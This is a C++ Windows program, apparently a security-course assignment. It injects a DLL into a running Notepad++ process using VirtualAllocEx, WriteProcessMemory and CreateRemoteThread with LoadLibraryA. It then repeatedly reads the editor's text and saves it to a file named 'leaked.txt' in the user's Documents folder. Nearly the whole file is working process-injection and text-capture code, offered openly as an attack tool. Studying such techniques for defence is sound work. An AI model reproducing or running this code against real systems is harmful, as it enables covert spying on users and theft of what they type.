#pragma warning(disable:4996)

#include <windows.h>
#include <iostream>
#include <string>
#include <shlobj.h>
#include <fstream>
#include <knownfolders.h>  // for FOLDERID_Documents

void InjectDLL(DWORD pid, LPCSTR dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (NULL == hProcess) {
        printf("Process not found\n");
        return;
    }
    LPVOID lpAddr = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (lpAddr) {
        WriteProcessMemory(hProcess, lpAddr, dllPath, strlen(dllPath) + 1, NULL);
    }
    else {
        printf("VirtualAllocEx() failure.\n");
        return;
    }
    LPTHREAD_START_ROUTINE pfnLoadLibraryA = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (pfnLoadLibraryA) {
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnLoadLibraryA, lpAddr, 0, NULL);
        DWORD dwExitCode = NULL;
        if (hThread) {
            printf("Injection successful!\n");
            WaitForSingleObject(hThread, INFINITE);
            if (GetExitCodeThread(hThread, &dwExitCode)) printf("Injected DLL ImageBase: %#x\n", dwExitCode);
            CloseHandle(hThread);
        }
        else {
            printf("Injection failure.\n");
        }
    }
    VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);
}

//void startSpy(HWND hwnd) {
//    
//    std::string buffer;
//    while (true) {
//        HWND hEdit = FindWindowEx(hwnd, NULL, L"Scintilla", NULL);
//        if (hEdit) {
//            SendMessageA(hEdit, WM_GETTEXT, sizeof(buffer), buffer);
//            std::cout << buffer << std::endl;
//        }
//        Sleep(1000);
//    }
//}

void startSpy(HWND hwnd) {
    std::string previousText;

    // Get the path to the "My Documents" folder
    WCHAR myDocumentsPath[MAX_PATH] = { 0. };

    HRESULT result = SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, 0, (LPWSTR)myDocumentsPath);
    wcscat_s(myDocumentsPath, L"\\leaked.txt");
    if (result != S_OK) {
        std::cerr << "Failed to get My Documents path." << std::endl;
        return;
    }

    /*std::cout << myDocumentsPath << std::endl;*/
     /*Create the full path for the log file*/
    while (true) {
        HWND hEdit = FindWindowEx(hwnd, NULL, L"Scintilla", NULL);
        if (hEdit) {
            LRESULT textLength = SendMessage(hEdit, WM_GETTEXTLENGTH, 0, 0);
            if (textLength >= 0) {
                std::string buffer(textLength + 1, '\0');
                SendMessageA(hEdit, WM_GETTEXT, (WPARAM)(textLength + 1), (LPARAM)buffer.data());
                if (buffer != previousText) {
                    std::ofstream logFile(myDocumentsPath);
                    if (logFile.is_open()) {
                        logFile << buffer << std::endl;
                        logFile.close();
                    }
                    else {
                        std::cerr << "Failed to open log file." << std::endl;
                    }
                    previousText = buffer;
                }
            }
        }
        Sleep(1000);
    }
}
int main()
{
    /*const char* dllPath = "C:\\Users\\KOREA\\Desktop\\attack\\Release\\attack.dll";*/
    const char* dllPath = "C:\\Users\\mm0ck3r\\Desktop\\lesson37\\assign06\\Project_real\\Release\\Dll.dll";
    DWORD processID = 0;
    HWND hwnd;
    if (GetFileAttributesA(dllPath) == 0xffffffff) {
        printf("dll not found!\n");
        return 1;
    }
    printf("Looking for \"notepad++.exe\".......\n");
    while (1) {
        hwnd = FindWindow(L"Notepad++", NULL);
        if (hwnd)
        {
            GetWindowThreadProcessId(hwnd, &processID);
            InjectDLL(processID, dllPath);
            break;
        }
        Sleep(500);
    }
    printf("say 'y' when you want to spy on the notepad++: ");
    while (1) {
        char isY;
        scanf(" %c", &isY);
        if (isY == 'y') {
            startSpy(hwnd);
            break;
        }
        printf("say 'y' when you want to spy on the notepad++: ");
    }
    ;
    return 0;
}
